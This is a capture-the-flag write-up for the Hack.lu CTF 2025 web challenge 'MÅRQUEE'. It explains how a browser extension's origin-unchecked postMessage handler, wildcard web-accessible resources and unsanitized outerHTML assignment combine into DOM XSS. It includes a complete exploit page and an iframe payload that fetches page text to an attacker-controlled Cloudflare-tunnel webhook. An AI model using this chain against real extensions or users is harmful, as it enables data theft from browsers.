---
title: "MÅRQUEE - Hack.lu CTF 2025"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "dom-xss", "rquee", "hack-lu-ctf", "hack-lu-ctf-2025", "2025", "ctf-writeup"]
summary: "The challenge involves exploiting a browser extension called \"TagDeprecater\" that removes deprecated HTML tags from web pages."
source:
  name: "CTFtime writeup #40475"
  url: "https://ctftime.org/writeup/40475"
ctf:
  name: "Hack.lu CTF 2025"
  year: 2025
  challenge: "MÅRQUEE"
---

## Metadata

- **CTF:** Hack.lu CTF 2025
- **Task:** MÅRQUEE
- **Author team:** Cyclopropenylidene
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/40475>

---
# [Hack.lu](http://Hack.lu) CTF 2025 MARQUEE Writeup (Web)

writeup: **fridgebuyer**

Category: **Web**

## Challenge Overview  
The challenge involves exploiting a browser extension called "TagDeprecater" that removes deprecated HTML tags from web pages. A bot visits a user-supplied URL with this extension loaded, and the flag is served on http://localhost:1337 inside a <marquee> tag.

## Vulnerability Analysis

### 1. No Origin Validation in postMessage Handler (popup.js:28-37)  
The extension popup listens for postMessage events without validating the origin:  
```javascript  
window.addEventListener("message", (event) => {  
if (event.data.type === 'SET') {  
chrome.storage.sync.set({ replacementString: event.data.replacementString });  
}  
});  
```  
Any page that can access the popup window can send it messages and set arbitrary replacementString values.

### 2. All Resources are Web-Accessible (manifest.json:35-44)  
```json  
"web_accessible_resources": [{  
"resources": ["*"],  
"matches": ["<all_urls>"]  
}]  
```  
This allows any website to iframe the extension's popup.html, making it accessible for postMessage communication.

### 3. DOM-based XSS via outerHTML Assignment (content.js:34)  
```javascript  
elements.forEach((el) => {  
el.outerHTML = replacementString;  
});  
```  
The content script replaces deprecated tags using unsanitized HTML assignment. If replacementString contains HTML with inline event handlers, it will execute JavaScript.

## Extension ID Calculation  
Chrome generates deterministic extension IDs for unpacked extensions based on the path:  
\- Path: /app/TagDeprecater  
\- Extension ID: pnalnbkfknoddllnlcbifndnghnlggjl

The ID is calculated by taking the SHA256 hash of the absolute path and converting the first 128 bits to the 'a'-'p' alphabet (32 characters).

## Attack Flow

1\. Victim bot visits attacker's malicious webpage  
2\. Malicious page creates a hidden iframe to the extension's popup.html using the calculated extension ID  
3\. Malicious page sends a postMessage to the iframe with type 'SET' and a malicious replacementString  
4\. The popup accepts the message and stores the malicious string in chrome.storage.sync  
5\. Malicious page redirects to http://localhost:1337  
6\. Content script runs on localhost:1337, finds the <marquee> tag containing the flag  
7\. Content script replaces <marquee> with the malicious replacementString  
8\. The XSS payload executes and exfiltrates the flag to attacker's server

## The Timing Challenge

Initial attempts to exfiltrate the flag directly from document.body.innerText failed because:  
\- When el.outerHTML = replacementString executes, it replaces the entire <marquee> element AND its children  
\- By the time the XSS payload's onerror handler executes, the flag text is already gone  
\- The marquee element no longer exists in the DOM

## Solution: Iframe Re-fetch Technique

The successful approach uses an iframe to re-fetch the flag page:

```javascript  
const payload = `<iframe src="http://localhost:1337" onload="fetch('${EXFIL_SERVER}/?flag='+encodeURIComponent(this.contentDocument.body.innerText))" style="display:none"></iframe>`;  
```

This works because:  
1\. The injected iframe makes a NEW request to localhost:1337  
2\. That fresh page load contains its own <marquee> tag with the flag  
3\. The onload handler can read this.contentDocument.body.innerText before the content script processes it  
4\. The flag is successfully exfiltrated to the attacker's webhook server

## Exploit Setup

### Infrastructure:  
1\. Webhook server (Python): Listens on port 8000 to receive exfiltrated data  
2\. Cloudflare tunnel: Exposes local webhook server publicly  
3\. Web server: Serves exploit.html on port 80

### Steps:  
1\. Start webhook server: `python3 [webhook_server.py](http://webhook_server.py)`  
2\. Create public tunnel: `cloudflared tunnel --url http://localhost:8000`  
3\. Update exploit_clean.html with the cloudflare tunnel URL  
4\. Serve exploit from web server on port 80  
5\. Submit exploit URL to CTF bot  
6\. Bot visits exploit, gets pwned, flag exfiltrated to webhook

## Exploit Code (exploit_clean.html)

```html

<html>  
<head>  
<title>MARQUEE Exploit</title>  
</head>  
<body>  
<h1>TagDeprecater Exploit</h1>  
<script>  
const EXTENSION_ID = 'pnalnbkfknoddllnlcbifndnghnlggjl';  
const EXFIL_SERVER = 'https://********.trycloudflare.com';

const payload = `<iframe src="http://localhost:1337" onload="fetch('${EXFIL_SERVER}/?flag='+encodeURIComponent(this.contentDocument.body.innerText))" style="display:none"></iframe>`;

const iframe = document.createElement('iframe');  
iframe.src = `chrome-extension://${EXTENSION_ID}/popup.html`;  
iframe.style.display = 'none';  
document.body.appendChild(iframe);

iframe.onload = () => {  
iframe.contentWindow.postMessage({  
type: 'SET',  
replacementString: payload  
}, '*');

setTimeout(() => {  
window.location.href = 'http://localhost:1337';  
}, 1000);  
};  
</script>  
</body>  
</html>  
```

## Flag  
```  
=======================  
WEBHOOK RECEIVED!  
=======================  
Path: /?flag=flag%7Bextension_rebellion_v3%7D  
Parameters: {  
"flag": [  
"flag{extension_rebellion_v3}"  
]  
}

? FLAG CAPTURED:  
flag{extension_rebellion_v3}

=======================  
```
